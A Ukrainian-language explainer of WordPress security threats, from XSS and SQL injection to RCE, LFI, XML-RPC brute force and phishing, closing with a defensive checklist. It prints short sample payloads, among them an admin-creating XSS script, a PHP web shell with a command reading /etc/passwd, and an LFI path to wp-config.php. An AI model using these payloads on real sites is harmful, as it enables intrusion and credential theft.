# Детальний аналіз загроз безпеки для WordPress

## Cross-Site Scripting (XSS)

**Визначення:** XSS — це тип вразливості, що дозволяє зловмисникам впроваджувати шкідливі скрипти (зазвичай JavaScript) у веб-сторінки, які переглядаються іншими користувачами.

**Типи XSS:**
- **Відображений XSS** — шкідливий код передається через URL і виконується, коли сервер повертає цей код у відповіді
- **Збережений XSS** — шкідливий код зберігається в базі даних сайту (наприклад, у коментарях)
- **DOM-based XSS** — атака виконується через маніпуляції з DOM на стороні клієнта

**Приклад для WordPress:**
```
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://example.com/wp-admin/user-new.php?action=createuser&user_login=hacker&pass1=password123&pass2=password123&role=administrator', true);
  xhr.withCredentials = true;
  xhr.send();
</script>
```

Цей скрипт, вставлений у коментар або форму, може створити нового адміністратора, якщо його переглядає авторизований адміністратор сайту.

## SQL-ін'єкції

**Визначення:** Техніка атаки, при якій зловмисник вставляє зловмисний SQL-код у запити до бази даних через незахищені форми введення.

**Приклад для WordPress:**
```
' OR 1=1 --
```

Вставлення цього тексту в незахищене поле пошуку може призвести до виконання небезпечного запиту:
```
SELECT * FROM wp_posts WHERE post_title LIKE '%' OR 1=1 --%'
```
Цей запит поверне всі записи, обходячи наміри розробників.

## Cross-Site Request Forgery (CSRF)

**Визначення:** Атака, в якій зловмисник змушує авторизованого користувача виконати певну дію без його відома.

**Приклад для WordPress:**
```html
<img src="https://example.com/wp-admin/options.php?option_page=general&email=hacker@example.com" style="display:none" />
```

Якщо адміністратор відкриє сторінку з цим кодом, може відбутися несанкціонована зміна налаштувань сайту.

## Remote Code Execution (RCE)

**Визначення:** Вразливість, що дозволяє зловмиснику виконувати довільний код на сервері.

**Приклад для WordPress:**
Вразливий плагін може дозволити завантаження файлів PHP через незахищену форму:
```php
<?php system($_GET['cmd']); ?>
```
Після завантаження такого файлу, зловмисник може виконувати команди: `example.com/uploads/backdoor.php?cmd=cat /etc/passwd`

## Local File Inclusion (LFI)

**Визначення:** Вразливість, що дозволяє зловмиснику включати локальні файли сервера до обробки.

**Приклад для WordPress:**
```
https://example.com/wp-content/plugins/vulnerable-plugin/index.php?template=../../../wp-config.php
```
Цей запит може розкрити конфіденційний файл wp-config.php з обліковими даними бази даних.

## Brute Force атаки

**Визначення:** Метод спроб і помилок для підбору паролів через автоматизовані спроби входу.

**Приклад для WordPress:**
Зловмисники використовують спеціальні скрипти, які автоматично надсилають тисячі комбінацій логінів і паролів до сторінки wp-login.php.

## XML-RPC атаки

**Визначення:** Зловживання інтерфейсом WordPress XML-RPC для перебору паролів або DDoS-атак.

**Приклад:**
```xml
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password</value></param>
  </params>
</methodCall>
```
Цей запит перевіряє одну комбінацію логіна/пароля, але запит до xmlrpc.php з методом system.multicall може перевірити одразу сотні паролів.

## Нульові дні (Zero-day)

**Визначення:** Вразливості, які ще не виправлені офіційними оновленнями і використовуються зловмисниками до появи патчів.

**Приклад:** У 2022 році було виявлено вразливість у плагіні Elementor, яка дозволяла зловмисникам вводити шкідливий JavaScript до шаблонів до того, як виправлення стало доступним.

## Фішинг

**Визначення:** Створення підроблених сторінок для викрадення облікових даних.

**Приклад для WordPress:**
Зловмисники створюють копію сторінки входу WordPress, розміщують її на схожому домені і надсилають посилання потенційним жертвам:
```
https://wordpress-admin-verify.com/wp-login.php
```

## Захист WordPress-сайту:

1. **Регулярні оновлення** всіх компонентів
2. **Двофакторна автентифікація**
3. **Web Application Firewall (WAF)** 
4. **Обмеження спроб входу**
5. **Сканування безпеки** 
6. **Правильні налаштування прав доступу** до файлів
7. **Використання HTTPS** з правильною конфігурацією
8. **Регулярне резервне копіювання**
9. **Мінімізація використовуваних плагінів**
10. **Рандомізація префіксів таблиць** бази даних

Реалізація цих заходів значно підвищить безпеку WordPress-сайту та зменшить ризик успішних атак.
